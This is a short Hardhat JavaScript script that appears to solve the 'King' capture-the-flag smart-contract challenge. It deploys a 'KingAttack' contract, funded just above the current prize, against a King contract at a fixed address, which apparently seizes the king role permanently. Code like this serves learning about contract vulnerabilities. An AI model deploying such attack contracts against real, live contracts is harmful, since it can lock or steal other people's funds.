const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
  const kingAddr = "0x284478214C3D095d9960C3fDFE398f5271D25747";

  const kingContract = await ethers.getContractAt("King", kingAddr);

  // Call contract to become king
  // const tx = await owner.sendTransaction({
  //   to: kingContract.address,
  //   value: ethers.utils.parseEther("0.05"),
  //   gasLimit: 100000,
  // });
  // await tx.wait();
  const etherToSend = ethers.utils.parseEther("0.08").add(1);
  const hackContract = await ethers.getContractFactory("KingAttack");
  const hack = await hackContract.deploy(kingContract.address, {
    value: etherToSend,
  });
  await hack.deployed();

  console.log(`hacker contract deployed at ${hack.address}`);

  // const hackTx = await hack.attack(kingContract.address);
  // console.log(hackTx.hash);
  // await hackTx.wait();
});
